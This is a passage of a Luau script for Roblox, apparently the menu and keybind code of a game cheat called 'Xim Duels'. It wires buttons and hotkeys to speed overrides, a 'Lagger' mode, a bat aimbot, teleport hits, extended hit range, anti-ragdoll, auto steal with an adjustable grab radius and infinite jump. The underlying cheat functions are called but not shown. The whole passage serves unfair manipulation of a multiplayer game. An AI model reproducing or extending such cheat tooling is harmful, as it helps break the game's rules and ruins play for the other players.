            Frame.Size = UDim2.new(0, MAIN_W, 0, MAIN_H)
            Frame.Position = UDim2.new(0, 14, 0, 10)
            Frame.BackgroundTransparency = 0
        end)
    end
    -- TS-style mini button (black capsule + white bold text, like ADAPT/CLEAN HUB)
    -- EvadeDuels-style mini open button
    local MinPill = Instance.new("TextButton")
    MinPill.Name = "MiniFrame"
    MinPill.Visible = false
    MinPill.Active = true
    MinPill.AutoButtonColor = false
    MinPill.ZIndex = 40
    MinPill.AnchorPoint = Vector2.new(0, 0)
    MinPill.Position = UDim2.new(0, 14, 0, 72)
    MinPill.Size = UDim2.new(0, 112, 0, 30)
    MinPill.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    MinPill.BackgroundTransparency = 0
    MinPill.BorderSizePixel = 0
    MinPill.Text = "Xim Duels"
    MinPill.TextColor3 = Color3.fromRGB(255, 255, 255)
    MinPill.Font = Enum.Font.GothamBold
    MinPill.TextSize = 12
    MinPill.TextStrokeTransparency = 1
    MinPill.Parent = gui
    Instance.new("UICorner", MinPill).CornerRadius = UDim.new(1, 0)
    do
        local st = Instance.new("UIStroke")
        st.Color = Color3.fromRGB(255, 255, 255)
        st.Thickness = 1
        st.Transparency = 0.75
        st.Parent = MinPill
    end
    pcall(function() M.placeDotsOn(MinPill, 20, 999, 7) end)

    MinPill.MouseButton1Click:Connect(function()
        MinPill.Visible = false
        Frame.Visible = true
        M.menuOpen = true
        pcall(saveCherryConfig)
    end)

    local function minimize()
        Frame.Visible = false
        MinPill.Visible = true
        M.menuOpen = false
        pcall(saveCherryConfig)
    end
    MinBtn.MouseButton1Click:Connect(minimize)

    -- re-force close style after any theme pass
    task.defer(function()
        if MinBtn and MinBtn.Parent then
            MinBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            MinBtn.BackgroundTransparency = 0
            MinBtn.Text = "-"
            MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
            MinBtn.TextTransparency = 0
            MinBtn.Font = Enum.Font.GothamBlack
            MinBtn.TextSize = 20
        end
        if DestroyBtn and DestroyBtn.Parent then
            DestroyBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            DestroyBtn.BackgroundTransparency = 0
            DestroyBtn.Text = "X"
            DestroyBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
            DestroyBtn.Font = Enum.Font.GothamBlack
            DestroyBtn.TextSize = 14
        end
    end)

    -- DRAGGING (saves menu position on rejoin)
    do
        local function makeDrag(obj, target, savePos)
            local drag,dStart,sPos
            obj.InputBegan:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then
                    drag=true; dStart=i.Position; sPos=target.Position
                    i.Changed:Connect(function()
                        if i.UserInputState==Enum.UserInputState.End then
                            drag=false
                            if savePos then
                                M.menuPosX = target.Position.X.Offset
                                M.menuPosY = target.Position.Y.Offset
                                pcall(saveCherryConfig)
                            end
                        end
                    end)
                end
            end)
            obj.InputChanged:Connect(function(i)
                if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then
                    if drag then
                        local d=i.Position-dStart
                        target.Position=UDim2.new(sPos.X.Scale,sPos.X.Offset+d.X,sPos.Y.Scale,sPos.Y.Offset+d.Y)
                    end
                end
            end)
        end
        makeDrag(Header, Frame, false) -- do not save menu position across rejoins
        makeDrag(MinPill, MinPill, false)
    end

    -- KEYBIND CAPTURE
    M._anyKeyListening = false
    -- ============================================================
    -- KEYBINDS (stable id map — no shared refs / no stacked connections)
    -- ============================================================
    local activeKBId = nil
    local listeningTimeout = nil
    M.keybindButtons = {}  -- id -> { btn, entry }

    if M._keybindCaptureConn then
        pcall(function() M._keybindCaptureConn:Disconnect() end)
        M._keybindCaptureConn = nil
    end
    M._anyKeyListening = false

    local function formatKeybindText(entry)
        if not entry then return "..." end
        local parts = {}
        if entry.kb then table.insert(parts, entry.kb.Name) end
        if entry.gp then table.insert(parts, entry.gp.Name) end
        if #parts == 0 then return "..." end
        return table.concat(parts, " / ")
    end

    local function refreshKeybindButton(id)
        local info = M.keybindButtons[id]
        if not info or not info.btn then return end
        info.btn.Text = formatKeybindText(info.entry)
        info.btn.TextColor3 = UI_TEXT_DIM
    end

    local function resetKeybindCapture()
        if activeKBId then
            refreshKeybindButton(activeKBId)
            activeKBId = nil
        end
        M._anyKeyListening = false
        if listeningTimeout then
            pcall(function() task.cancel(listeningTimeout) end)
            listeningTimeout = nil
        end
    end

    local function isGamepadInputType(uit)
        return uit == Enum.UserInputType.Gamepad1
            or uit == Enum.UserInputType.Gamepad2
            or uit == Enum.UserInputType.Gamepad3
            or uit == Enum.UserInputType.Gamepad4
            or uit == Enum.UserInputType.Gamepad5
            or uit == Enum.UserInputType.Gamepad6
            or uit == Enum.UserInputType.Gamepad7
            or uit == Enum.UserInputType.Gamepad8
    end

    -- Clear this key from every OTHER keybind so one key = one action
    local function clearKeyFromOthers(exceptId, kind, keycode)
        if not keycode then return end
        for id, info in pairs(M.keybindButtons) do
            if id ~= exceptId and info and info.entry then
                if kind == "kb" and info.entry.kb == keycode then
                    info.entry.kb = nil
                    refreshKeybindButton(id)
                elseif kind == "gp" and info.entry.gp == keycode then
                    info.entry.gp = nil
                    refreshKeybindButton(id)
                end
            end
        end
        -- also scrub KB table entries that might not be in the UI map yet
        for name, entry in pairs(M.KB) do
            if type(entry) == "table" then
                local mapped = false
                for id, info in pairs(M.keybindButtons) do
                    if info.entry == entry then mapped = true break end
                end
                if not mapped then
                    if kind == "kb" and entry.kb == keycode then entry.kb = nil end
                    if kind == "gp" and entry.gp == keycode then entry.gp = nil end
                end
            end
        end
    end

    local function uiKeybindRow(parent, label, kbEntry, bindId)
        bindId = bindId or label
        -- EvadeDuels keybind boxes (same pure-black value box as speed)
        local r = Instance.new("Frame"); r.ClipsDescendants = true; r.Size = UDim2.new(1,0,0,44)
        r.BackgroundColor3 = Color3.fromRGB(0, 0, 0); r.BackgroundTransparency = 0; r.BorderSizePixel = 0; r.Parent = parent
        Instance.new("UICorner", r).CornerRadius = UDim.new(0, 10)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-90,1,0); l.BackgroundTransparency=1
        l.Text=label; l.TextColor3=Color3.fromRGB(255,255,255); l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local btn = Instance.new("TextButton")
        btn.Position = UDim2.new(1, -72, 0.5, -14)
        btn.Size = UDim2.new(0, 60, 0, 28)
        btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btn.BorderSizePixel = 0
        btn.Text = formatKeybindText(kbEntry)
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.GothamBold
        btn.TextSize = 13
        btn.AutoButtonColor = false
        btn.Parent = r
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 14)
        do
            local kst = Instance.new("UIStroke")
            kst.Color = Color3.fromRGB(30, 30, 30)
            kst.Thickness = 1
            kst.Transparency = 0.25
            kst.Parent = btn
        end
        M.keybindButtons[bindId] = { btn = btn, entry = kbEntry }

        btn.MouseButton1Click:Connect(function()
            if activeKBId and activeKBId ~= bindId then resetKeybindCapture() end
            activeKBId = bindId
            btn.Text = "Press key / button..."
            btn.TextColor3 = Color3.fromRGB(180,180,180)
            M._anyKeyListening = true
            if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end) end
            listeningTimeout = task.delay(8, resetKeybindCapture)
        end)
        return r
    end

    local function kbMatch(entry, keycode)
        if not entry or not keycode or keycode == Enum.KeyCode.Unknown then return false end
        if entry.kb and entry.kb == keycode then return true end
        if entry.gp and entry.gp == keycode then return true end
        return false
    end

    M._keybindCaptureConn = UIS.InputBegan:Connect(function(input, gameProcessed)
        -- Capture rebind
        if M._anyKeyListening then
            if activeKBId then
                local kc = input.KeyCode
                if kc == Enum.KeyCode.Escape then
                    resetKeybindCapture()
                    pcall(saveCherryConfig)
                    return
                end
                local info = M.keybindButtons[activeKBId]
                if not info or not info.entry then
                    resetKeybindCapture()
                    return
                end
                local uit = input.UserInputType
                if uit == Enum.UserInputType.Keyboard and kc ~= Enum.KeyCode.Unknown then
                    clearKeyFromOthers(activeKBId, "kb", kc)
                    info.entry.kb = kc
                    refreshKeybindButton(activeKBId)
                    activeKBId = nil
                    M._anyKeyListening = false
                    if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end); listeningTimeout = nil end
                    pcall(saveCherryConfig)
                elseif isGamepadInputType(uit) and kc ~= Enum.KeyCode.Unknown then
                    clearKeyFromOthers(activeKBId, "gp", kc)
                    info.entry.gp = kc
                    refreshKeybindButton(activeKBId)
                    activeKBId = nil
                    M._anyKeyListening = false
                    if listeningTimeout then pcall(function() task.cancel(listeningTimeout) end); listeningTimeout = nil end
                    pcall(saveCherryConfig)
                end
            end
            return
        end

        if gameProcessed then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard and not isGamepadInputType(input.UserInputType) then return end
        local kc = input.KeyCode
        if kc == Enum.KeyCode.Unknown then return end

        -- One key → one action (elseif chain)
        if kbMatch(M.KB.LaggerToggle, kc) then
            -- Speed Customizer: Lagger key TOGGLES Lagger <-> Normal (so you can switch back)
            if (M.speedUIMode or "Original") == "Customizer" then
                M.toggleSpeedCustomizerPath()
            else
                local now = tick()
                if not M._lastLaggerBindPress or now - M._lastLaggerBindPress > 0.12 then
                    M._lastLaggerBindPress = now
                    M.cycleLaggerModeBind()
                end
            end
        elseif kbMatch(M.KB.SpeedToggle, kc) then
            -- Speed Customizer: Carry key always forces NORMAL path
            if (M.speedUIMode or "Original") == "Customizer" then
                M.setSpeedCustomizerPath("Normal")
            else
                M.toggleCarryMode()
                task.defer(function() pcall(saveCherryConfig) end)
            end
        elseif kbMatch(M.KB.DropBrainrot, kc) then
            -- only if a real key is bound (prevents nil/ghost triggers)
            if M.KB.DropBrainrot and (M.KB.DropBrainrot.kb or M.KB.DropBrainrot.gp) then
                M.runDrop()
            end
        elseif kbMatch(M.KB.TPFloor, kc) then
            M.runTPFloor() -- no cooldown
        elseif kbMatch(M.KB.PingLagger, kc) then
            if M.pingPanelOpen then
                if M.setPingActive then
                    M.setPingActive(not M.pingActive, true)
                else
                    M.pingActive = not M.pingActive
                end
            end
            if M.KB.PingLagger and M.KB.PingLagger.kb then M.pingKeybindKb = M.KB.PingLagger.kb.Name end
            if M.KB.PingLagger and M.KB.PingLagger.gp then M.pingKeybindGp = M.KB.PingLagger.gp.Name end
        elseif kbMatch(M.KB.AutoLeft, kc) then
            M.autoLeftEnabled = not M.autoLeftEnabled
            if M.autoLeftEnabled then
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoLeft()
            else
                M.stopAutoLeft()
            end
            if M.autoLeftSetVisual then M.autoLeftSetVisual(M.autoLeftEnabled) end
            if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.AutoRight, kc) then
            M.autoRightEnabled = not M.autoRightEnabled
            if M.autoRightEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoBatEnabled then M.stopBatAimbot() end
                M.startAutoRight()
            else
                M.stopAutoRight()
            end
            if M.autoRightSetVisual then M.autoRightSetVisual(M.autoRightEnabled) end
            if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.AutoBat, kc) then
            if not M.autoBatEnabled then
                if M.autoLeftEnabled then M.autoLeftEnabled = false; M.stopAutoLeft() end
                if M.autoRightEnabled then M.autoRightEnabled = false; M.stopAutoRight() end
                M.queueAutoBatStart()
            else
                M.stopBatAimbot()
            end
            if M.autoBatSetVisual then M.autoBatSetVisual(M.autoBatEnabled) end
            if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.BypassAimbot, kc) then
            M.toggleBypassAimbot()
            if M.setBypassVisual then M.setBypassVisual(M.bypassAimbotEnabled) end
            if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
            saveCherryConfig()
        elseif kbMatch(M.KB.InstaReset, kc) then
            if M.cursedInstaReset then pcall(M.cursedInstaReset) end
        elseif kbMatch(M.KB.GuiHide, kc) then
            if Frame then
                Frame.Visible = not Frame.Visible
                MinPill.Visible = not Frame.Visible
                M.menuOpen = Frame.Visible == true
                pcall(saveCherryConfig)
            end
        end
    end)

    -- ============================================================
    -- PAGINE
    -- ============================================================

    -- PAGE: SPEED
    uiSectionHeader(PM, "SPEED STYLE")
    do
        local modeOpts = {"Original", "Customizer"}
        local modeIdx = ((M.speedUIMode or "Original") == "Customizer") and 2 or 1
        local _, setSpeedUIMode = uiChoiceRow(PM, "Speed UI Mode", modeOpts, modeIdx, function(v)
            M.speedUIMode = (v == "Original") and "Original" or "Customizer"
            if M.speedUIMode == "Customizer" then
                M.autoSwitchSpeedEnabled = false
                M.carrySpeedActive = false
                M.laggerCarryActive = false
                M.laggerModeEnabled = false
                M.speedBoosterPath = "Normal"
                if M.speedBoosterSyncPath then pcall(function() M.speedBoosterSyncPath("Normal") end) end
                if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
                if M.setSpeedBoosterPanelOpen then M.setSpeedBoosterPanelOpen(M.speedBoosterPanelOpen ~= false) end
            else
                if M.speedBoosterMain then M.speedBoosterMain.Visible = false end
            end
            if M._refreshSpeedUIBlocks then M._refreshSpeedUIBlocks() end
            pcall(function() M.refreshOriginalModeMobileButtons() end)
            pcall(saveCherryConfig)
        end)
        M.setSpeedUIModeVisual = setSpeedUIMode
    end

    local customizerWrap = Instance.new("Frame")
    customizerWrap.Name = "CustomizerWrap"
    customizerWrap.BackgroundTransparency = 1
    customizerWrap.Size = UDim2.new(1, 0, 0, 0)
    customizerWrap.AutomaticSize = Enum.AutomaticSize.Y
    customizerWrap.Parent = PM
    Instance.new("UIListLayout", customizerWrap).Padding = UDim.new(0, 8)

    local originalWrap = Instance.new("Frame")
    originalWrap.Name = "OriginalWrap"
    originalWrap.BackgroundTransparency = 1
    originalWrap.Size = UDim2.new(1, 0, 0, 0)
    originalWrap.AutomaticSize = Enum.AutomaticSize.Y
    originalWrap.Parent = PM
    Instance.new("UIListLayout", originalWrap).Padding = UDim.new(0, 8)

    do
        local _, setBoosterOpen = uiToggleRow(customizerWrap, "Open Speed Customizer", M.speedBoosterPanelOpen == true, function(on)
            if M.setSpeedBoosterPanelOpen then M.setSpeedBoosterPanelOpen(on) end
        end)
        M.setSpeedBoosterPanelVisual = setBoosterOpen
        uiActionRow(customizerWrap, "Reset Customizer Position", function()
            if M.resetSpeedBoosterPosition then M.resetSpeedBoosterPosition() end
        end)
        pcall(function()
            if not M.speedBoosterMain then M.buildSpeedBoosterUI() end
        end)
    end

    uiSectionHeader(originalWrap, "SPEED VALUES")
    local _, nsBox = uiStepNumberRow(originalWrap, "Normal Speed", M.NS, 1, 500, function(v) M.NS = v end)
    local _, csBox = uiStepNumberRow(originalWrap, "Normal Carry (STE)", M.CS, 1, 500, function(v) M.CS = v end)
    M.normalBox = nsBox; M.carryBox = csBox

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=PM; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local carryBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.carrySpeedActive and "Carry On" or "Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        carryBtn.MouseButton1Click:Connect(function()
            M.carrySpeedActive = not M.carrySpeedActive
            carryBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            M.refreshSpeedModeLabel()
            if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
            if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
            if M.carryModeBtn then M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off" end
            if M.laggerCarryBtn then M.laggerCarryBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off" end
            saveCherryConfig()
        end)
        M.carryModeBtn = carryBtn
    end

    local _, setAutoCarry = uiToggleRow(PM, "Auto Switch Carry", M.autoSwitchSpeedEnabled, function(on)
        M.autoSwitchSpeedEnabled = on
        M._autoSwitchWasSteal = nil
        if not on then
            if M.carryModeBtn then
                M.carryModeBtn.Text = M.carrySpeedActive and "Carry On" or "Carry Off"
            end
            if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
        end
        M.refreshWalkSpeedAutoSwitch()
        saveCherryConfig()
    end)
    M.setAutoCarryVisual = setAutoCarry
    local _, setAutoCarryBase = uiToggleRow(PM, "Auto Carry on Enemy Base", M.autoCarryEnemyBaseEnabled, function(on)
        M.setAutoCarryEnemyBase(on); saveCherryConfig()
    end)
    M.setAutoCarryEnemyBaseVisual = setAutoCarryBase
    local _, acbRangeBox = uiNumberRow(PM, "Enemy Base Range", M.autoCarryEnemyBaseRange or 35, 5, 150, function(v)
        M.autoCarryEnemyBaseRange = v; saveCherryConfig()
    end)
    M.autoCarryEnemyBaseRangeBox = acbRangeBox

    uiSectionHeader(PM, "LAGGER")
    local _, lsBox = uiStepNumberRow(PM, "Lagger Normal", M.LAGGER_SPEED, 1, 500, function(v) M.LAGGER_SPEED = v end)
    local _, lcBox = uiStepNumberRow(PM, "Lagger Carry (STE)", M.LAGGER_CARRY_SPEED, 1, 500, function(v) M.LAGGER_CARRY_SPEED = v end)
    M.laggerBox = lsBox

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=PM; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerModeEnabled and "Lag On" or "Lag Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerMode()
            modeBtn.Text = M.laggerModeEnabled and "Lag On" or "Lag Off"
        end)
        M.laggerModeBtn = modeBtn
    end

    do
        local r = Instance.new("Frame"); r.ClipsDescendants=true; r.Size=UDim2.new(1,0,0,46)
        r.BackgroundColor3=Color3.fromRGB(0, 0, 0); r.BackgroundTransparency=0; r.BorderSizePixel=0; r.Parent=PM; uiCardStyle(r)
        local l = Instance.new("TextLabel"); l.Position=UDim2.new(0,14,0,0); l.Size=UDim2.new(1,-74,1,0)
        l.BackgroundTransparency=1; l.Text="Lagger Carry Mode"; l.TextColor3=UI_TEXT_PRIMARY; l.TextSize=14; l.Font=Enum.Font.GothamMedium; l.TextXAlignment=Enum.TextXAlignment.Left; l.Parent=r
        local modeBtn = uiSmallBtn({Parent=r, Pos=UDim2.new(1,-100,0.5,-13), Size=UDim2.new(0,88,0,26),
            Text=M.laggerCarryActive and "L.Carry On" or "L.Carry Off", Col=UI_TEXT_PRIMARY, TS=12, CR=6, SC=UI_ACCENT, STr=0.3})
        modeBtn.MouseButton1Click:Connect(function()
            M.toggleLaggerCarry()
            modeBtn.Text = M.laggerCarryActive and "L.Carry On" or "L.Carry Off"
        end)
        M.laggerCarryBtn = modeBtn
    end

    -- PAGE: MECHANICS (contenuto completo con scroll funzionante)
    local function refreshSpeedUIBlocks()
        local isCustom = (M.speedUIMode or "Original") == "Customizer"
        customizerWrap.Visible = isCustom
        originalWrap.Visible = not isCustom
        if isCustom then
            if not M.speedBoosterMain then pcall(M.buildSpeedBoosterUI) end
            if M.speedBoosterMain then M.speedBoosterMain.Visible = (M.speedBoosterPanelOpen == true) end
            -- hide carry / lagger / l.carry mobile buttons in customizer mode
            M.carrySpeedActive = false
            M.laggerModeEnabled = false
            M.laggerCarryActive = false
        else
            if M.speedBoosterMain then M.speedBoosterMain.Visible = false end
        end
        pcall(function() M.refreshOriginalModeMobileButtons() end)
    end
    M._refreshSpeedUIBlocks = refreshSpeedUIBlocks
    refreshSpeedUIBlocks()

    uiSectionHeader(PMech, "STUFF")
    local _, setHardHit = uiToggleRow(PMech, "Hard Hit", M.hardHitEnabled, function(on)
        if on then M.startHardHit() else M.stopHardHit() end
        saveCherryConfig()
    end)
    M.setHardHitVisual = setHardHit
    uiNumberRow(PMech, "Hard Hit Range", M.hardHitRadius or 10, 1, 100, function(v)
        M.hardHitRadius = v
        if M._hardHitRing then
            M._hardHitRing.Radius = v
            M._hardHitRing.InnerRadius = math.max(0.1, v - 0.35)
        end
        saveCherryConfig()
    end)
    local _, setBatAimbot = uiToggleRow(PMech, "Bat Aimbot", M.autoBatEnabled, function(on)
        if on then M.queueAutoBatStart() else M.stopBatAimbot() end
    end)
    M.autoBatSetVisual = setBatAimbot

    local _, setBatCounter = uiToggleRow(PMech, "Bat Counter", M.batCounterEnabled, function(on)
        M.batCounterEnabled = on
        if on then M.startBatCounter() else M.stopBatCounter() end
        saveCherryConfig()
    end)
    M.setBatCounterVisual = setBatCounter

    local tpBatModeIdx = (M.tpBatHitMode == "Normal") and 2 or 1
    local _, setBypassVis, setTpBatModeUI = uiExpandToggleRow(
        PMech,
        "TP Bat",
        M.bypassAimbotEnabled,
        {"Sure Hit", "Normal Hit"},
        tpBatModeIdx,
        function(on)
            M.bypassAimbotEnabled = on
            if on then M.startBypassAimbot() else M.stopBypassAimbot() end
            if M.setBypassVisual then M.setBypassVisual(on) end
            if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(on) end
            saveCherryConfig()
        end,
        function(newMode)
            local wasOn = M.bypassAimbotEnabled
            if newMode == "Normal Hit" or newMode == "Normal" then
                M.tpBatHitMode = "Normal"
            else
                M.tpBatHitMode = "Sure"
            end
            if wasOn then
                M.stopBypassAimbot()
                task.wait()
                M.startBypassAimbot()
            end
            pcall(saveCherryConfig)
            if M.setTpBatModeUI then
                pcall(M.setTpBatModeUI, M.tpBatHitMode == "Normal" and "Normal Hit" or "Sure Hit")
            end
        end
    )
    M.setBypassVisual = setBypassVis
    M.setTpBatModeUI = setTpBatModeUI

    local _, setAntiRag = uiToggleRow(PMech, "Anti Ragdoll", M.antiRagdollEnabled, function(on)
        M.antiRagdollEnabled = on
        if on then M.startAntiRagdoll() else M.stopAntiRagdoll() end
    end)
    M.setAntiRagVisual = setAntiRag

    local _, setAntiRagModeUI = uiChoiceRow(PMech, "Anti Ragdoll Mode", {"Splatter","No Splatter"},
        M.antiRagdollMode == "No Splatter" and 2 or 1,
        function(newMode)
            M.antiRagdollMode = (newMode == "No Splatter") and "No Splatter" or "Splatter"
            if M.antiRagdollEnabled then M.stopAntiRagdoll(); M.startAntiRagdoll() end
        end
    )
    M.setAntiRagModeUI = setAntiRagModeUI

    local _, setMedusa = uiToggleRow(PMech, "Medusa Counter", M.medusaCounterEnabled, function(on)
        M.medusaCounterEnabled = on
        if on then
            M.setupMedusa(player.Character)
        else
            M.stopMedusaCounter()
        end
        saveCherryConfig()
    end)
    M.setMedusaVisual = setMedusa

    local _, setAutoSwing = uiToggleRow(PMech, "Auto Swing", M.autoSwingEnabled, function(on)
        M.autoSwingEnabled = on
    end)
    M.setAutoSwingVisual = setAutoSwing


    uiSectionHeader(PMech, "STEAL")
    local stealModeLabels = {"V2", "Semi"}
    local function stealLabelToMode(lab)
        if lab == "Semi" then return "Semi" end
        return "V2"
    end
    local function stealModeToLabel(mode)
        if mode == "Semi" then return "Semi" end
        return "V2"
    end
    local stealDefaultIdx = 1
    do
        local lab = stealModeToLabel(M.stealMode)
        for i, v in ipairs(stealModeLabels) do if v == lab then stealDefaultIdx = i break end end
    end

    local _, setAutoSteal, setStealModeUI, regStealSettings = uiExpandToggleRow(
        PMech,
        "Auto Steal",
        M.Steal.AutoStealEnabled,
        stealModeLabels,
        stealDefaultIdx,
        function(on)
            M.Steal.AutoStealEnabled = on
            if on then M.startAutoSteal() else M.stopAutoSteal() end
        end,
        function(newLabel)
            local oldMode = M.stealMode
            M.stealMode = stealLabelToMode(newLabel)
            if M.updateStatusModeBadge then pcall(M.updateStatusModeBadge) end
            if oldMode ~= M.stealMode and M.Steal.AutoStealEnabled then
                M.stopAutoSteal(); M.startAutoSteal()
            end
            M.updateStatusRadius()
        end
    )
    M.setInstaGrab = setAutoSteal
    M.setStealModeUI = setStealModeUI

    -- V2 settings
    local v2Box = Instance.new("Frame"); v2Box.BackgroundTransparency=1; v2Box.Size=UDim2.new(1,0,0,0); v2Box.AutomaticSize=Enum.AutomaticSize.Y
    local v2Lay = Instance.new("UIListLayout"); v2Lay.Padding=UDim.new(0,6); v2Lay.Parent=v2Box
    local _, srBox = uiNumberRow(v2Box, "Grab Radius", M.Steal.StealRadius, 0.5, 300, function(v)
        M.Steal.StealRadius = v; M.setStealRadius(v); M.updateStatusRadius()
    end)
    M.radInput = srBox
    local _, sdBox = uiNumberRow(v2Box, "Hold Duration", M.Steal.StealDuration, 0.1, 10, function(v)
        M.Steal.StealDuration = v
    end)
    M.durationBox = sdBox
    local _, setAutoRadius = uiToggleRow(v2Box, "Auto Radius", M.autoRadiusEnabled, function(on)
        M.autoRadiusEnabled = on; M.updateStatusRadius()
    end)
    M.setAutoRadiusVisual = setAutoRadius
    regStealSettings("V2", v2Box)

    -- Semi settings
    local semiBox = Instance.new("Frame"); semiBox.BackgroundTransparency=1; semiBox.Size=UDim2.new(1,0,0,0); semiBox.AutomaticSize=Enum.AutomaticSize.Y
    local semiLay = Instance.new("UIListLayout"); semiLay.Padding=UDim.new(0,6); semiLay.Parent=semiBox
    local _, semiRadBox = uiNumberRow(semiBox, "Semi Radius (max 10)", math.min(M.Semi.radius,10), 0.5, 10, function(v)
        M.Semi.radius = math.min(v,10)
        if semiRadBox then semiRadBox.Text = tostring(M.Semi.radius) end
    end)
    M.semiRadInput = semiRadBox
    local _, semiHoldMin = uiNumberRow(semiBox, "Hold Min", M.Semi.holdMin or 1.3, 0.1, 5, function(v) M.Semi.holdMin = v end)
    local _, semiHoldMax = uiNumberRow(semiBox, "Hold Max", M.Semi.holdMax or 2.6, 0.1, 8, function(v) M.Semi.holdMax = v end)
    regStealSettings("Semi", semiBox)


    local _, sbBox = uiNumberRow(PMech, "Steal Bar Size", 280, 200, 400, function(v)
        M.stealBarSize = math.clamp(v, 200, 400); M.buildStatusUI()
    end)

    uiSectionHeader(PMech, "MOTION")
    local jumpDefaultIdx = (M.infJumpMode == "hold") and 2 or 1
    local _, setInfJump, setJumpModeUI = uiExpandToggleRow(
        PMech,
        "Infinite Jump",
        M.infJumpEnabled,
        {"Manual", "Hold"},
        jumpDefaultIdx,
        function(on)
            M.infJumpEnabled = on
            if on and M.infJumpMode == "manual" then M.startManualInfJumpLoop()
            elseif on and M.infJumpMode == "hold" then M.startHoldInfJump()
            else M.stopManualInfJumpLoop(); M.stopHoldInfJump() end
        end,
        function(newMode)
            local wasOn = M.infJumpEnabled
            M.infJumpMode = (newMode == "Hold") and "hold" or "manual"
            if wasOn then
                M.stopManualInfJumpLoop(); M.stopHoldInfJump()
                if M.infJumpMode == "manual" then M.startManualInfJumpLoop()
                else M.startHoldInfJump() end
            end
        end
    )
    M.setInfJumpVisual = setInfJump
    M.setJumpModeUI = setJumpModeUI


    local _, setAL = uiToggleRow(PMech, "Auto Left", M.autoLeftEnabled, function(on)
        if on then
            if M.autoRightEnabled then M.autoRightEnabled=false; M.stopAutoRight(); if M.autoRightSetVisual then M.autoRightSetVisual(false) end end
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            M.autoLeftEnabled=true; M.startAutoLeft()
        else M.autoLeftEnabled=false; M.stopAutoLeft() end
        if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(on) end
    end)
    M.autoLeftSetVisual = setAL

    local _, setAR = uiToggleRow(PMech, "Auto Right", M.autoRightEnabled, function(on)
        if on then
            if M.autoLeftEnabled then M.autoLeftEnabled=false; M.stopAutoLeft(); if M.autoLeftSetVisual then M.autoLeftSetVisual(false) end end
            if M.autoBatEnabled then M.stopBatAimbot(); if M.autoBatSetVisual then M.autoBatSetVisual(false) end end
            M.autoRightEnabled=true; M.startAutoRight()
        else M.autoRightEnabled=false; M.stopAutoRight() end
        if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(on) end
    end)
    M.autoRightSetVisual = setAR

